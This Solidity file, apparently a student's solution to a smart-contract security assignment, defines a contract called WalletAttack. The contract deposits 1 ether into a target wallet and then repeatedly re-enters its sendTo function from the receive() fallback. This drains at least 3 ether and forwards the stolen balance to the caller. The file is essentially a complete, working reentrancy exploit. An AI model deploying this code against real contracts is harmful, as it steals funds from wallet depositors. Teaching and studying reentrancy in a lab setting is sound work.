// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

interface WalletI {
    // This is the interface of the wallet to be attacked.
    function deposit() external payable;
    function sendTo(address payable dest) external;
}

contract WalletAttack {
    // A contract used to attack the Vulnerable Wallet.
    WalletI private _target;
    uint private constant TARGET_AMOUNT = 3 ether;
    uint private receivedAmount = 0;

    constructor() {
        // The constructor for the attacking contract.
        // Do not change the signature

    }

    function exploit(WalletI target) public payable {
        // runs the exploit on the target wallet.
        // you should not deposit more than 1 Ether to the vulnerable wallet.
        // Assuming the target wallet has more than 3 Ether in deposits,
        // you should withdraw at least 3 Ether from the wallet.
        // The money taken should be sent back to the caller of this function)
        _target = target;
        require(msg.value == 1 ether, "You must send exactly 1 ether");
        _target.deposit{value: 1 ether}();
        
        exploit_env();
        (bool success, ) = (payable (msg.sender)).call{value: address(this).balance}("");
        require(success, "Unsucceful 34");
        receivedAmount=0;
    }

    function exploit_env() public payable {
        // runs the exploit on the target wallet.
        // you should not deposit more than 1 Ether to the vulnerable wallet.
        // Assuming the target wallet has more than 3 Ether in deposits,
        // you should withdraw at least 3 Ether from the wallet.
        // The money taken should be sent back to the caller of this function)
        _target.sendTo(payable (address(this)));
    }

    receive () external payable {
        if (address(_target).balance >= 1 ether && receivedAmount < TARGET_AMOUNT) {
            receivedAmount += msg.value;
            this.exploit_env();
        }
    }
}
